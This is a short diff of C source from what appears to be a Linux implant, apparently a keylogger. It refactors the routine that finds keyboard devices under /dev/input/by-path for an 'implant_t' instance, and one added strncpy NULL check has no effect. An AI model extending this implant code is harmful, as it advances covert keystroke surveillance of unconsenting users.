@@ -21,6 +21,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <strings.h>
 #include <sys/dir.h>
 #include <sys/queue.h>
 #include <sys/stat.h>
@@ -35,7 +36,7 @@ is_kbd(const struct dirent *f) {
         return 0;
 
     len = strlen(f->d_name);
-    if (len < 3)
+    if (len < 4)
         return 0;
 
     return f->d_name[len - 3] == 'k' && f->d_name[len - 2] == 'b' &&
@@ -52,7 +53,6 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
     const char *dev_input_by_path = "/dev/input/by-path/";
 
     if (!instance) {
-
 #ifdef DEBUG
         DEBUG_LOG("[!] NULL ptr for instance struct\n");
 #endif
@@ -101,9 +101,16 @@ uint8_t fetch_available_keyboards(implant_t *instance) {
             continue;
         }
 
-        /* FIXME(djnn): this does not spark joy */
-        memset(kbd->name, 0, STRING_BUFFER_SIZE);
-        strncpy((char *)kbd->name, rpath, (STRING_BUFFER_SIZE - 1));
+        bzero(kbd->name, STRING_BUFFER_SIZE);
+        if (!strncpy((char *)kbd->name, rpath, (STRING_BUFFER_SIZE - 1))) {
+
+#ifdef DEBUG
+            DEBUG_LOG("[!] strncpy: kbd->name could not be copied\n");
+#endif
+
+            free(kbd);
+            continue;
+        }
         TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);
     }
 
